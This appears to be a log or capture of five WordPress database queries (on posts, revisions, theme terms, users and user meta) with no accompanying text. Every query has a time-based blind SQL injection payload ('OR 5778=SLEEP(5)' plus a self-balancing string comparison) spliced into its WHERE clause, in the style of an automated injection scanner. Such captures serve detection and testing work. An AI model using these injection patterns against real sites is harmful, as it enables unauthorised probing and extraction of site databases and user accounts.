SELECT wp_posts.ID FROM wp_posts WHERE 1=1 AND wp_posts.post_parent = 1 AND wp_posts.post_type = 'revision' AND ((wp_posts.post_status = 'inherit')) OR 5778=SLEEP(5) AND (('QkAW' LIKE 'QkAW')) ORDER BY wp_posts.post_date DESC, wp_posts.ID DESC
SELECT wp_posts.ID FROM wp_posts WHERE 1=1 AND wp_posts.post_type = 'post' AND ((wp_posts.post_author = 3 AND (wp_posts.post_status = 'future'))) OR 5778=SLEEP(5) AND ((('FJVC' LIKE 'FJVC'))) ORDER BY wp_posts.post_date ASC LIMIT 0, 5

SELECT t.*, tt.* FROM wp_terms AS t INNER JOIN wp_term_taxonomy AS tt ON t.term_id = tt.term_id WHERE tt.taxonomy IN ('wp_theme') AND t.name IN ('twentytwentyone') OR 5778=SLEEP(5) AND ('vjss'='vjss')
SELECT wp_users.ID,wp_users.user_login,wp_users.display_name FROM wp_users INNER JOIN wp_usermeta ON ( wp_users.ID = wp_usermeta.user_id ) WHERE 1=1 AND (( wp_usermeta.meta_key = 'wp_user_level' AND wp_usermeta.meta_value != '0')) OR 5778=SLEEP(5) AND (('TetO'='TetO' )) ORDER BY display_name ASC
SELECT post_author, COUNT(*) FROM wp_posts WHERE ( ( post_type = 'post' AND ( post_status = 'publish' OR post_status = 'private'))) OR 5778=SLEEP(5) AND ((('bBXR'='bBXR' ) ) ) AND post_author IN (1) GROUP BY post_author
